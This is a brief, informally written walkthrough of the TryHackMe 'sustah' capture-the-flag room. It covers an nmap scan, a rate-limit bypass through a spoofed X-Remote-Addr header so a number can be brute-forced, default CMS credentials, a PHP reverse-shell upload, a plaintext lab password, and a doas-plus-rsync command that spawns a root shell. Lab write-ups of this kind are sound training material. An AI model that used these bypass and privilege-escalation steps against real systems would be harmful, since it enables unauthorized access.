# sustah
https://tryhackme.com/room/sustah

#### NMAP 

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
    |   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
    |_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Susta
    8085/tcp open  http    Gunicorn 20.0.4
    |_http-server-header: gunicorn/20.0.4
    |_http-title: Spinner 
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

we have 3 open ports two HTTP/80 on 8085 webpage showsspinner whichs we have to input random num to get dir secret dir...

Give random number and intercept the request send to intruder

There is rate limit protection add this 
          
          X-Remote-Addr: 127.0.0.1 

header to bypass rate limit and set payload position in num=$213$ and set payload numbers from 10000 to 99999 step 1.

Start Attack

check length that when its change 1166 to 1636 and you got the thats path reaveled numbere.....

go to reveled path in 80/HTTP you got CMS....then login into cms using defalut user pass

then navigate to file upload functionality (http://target/codebase/dir.php?type=filenew) and upload a php reverse shell 

shell!!

www-data go to  /var/backups there is user password then sudo to user

kiran:trythispasswordforuserkiran

you got user.txt

## Privesc

run linuxpeas.sh 

[+] Checking doas.conf
 permit nopass kiran as root cmd rsync

we got this kiran can run rsync as root then search this cmd in GTFObins

got this 

    rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null 		\\not works
    
    doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null 

KABOOOM!! root






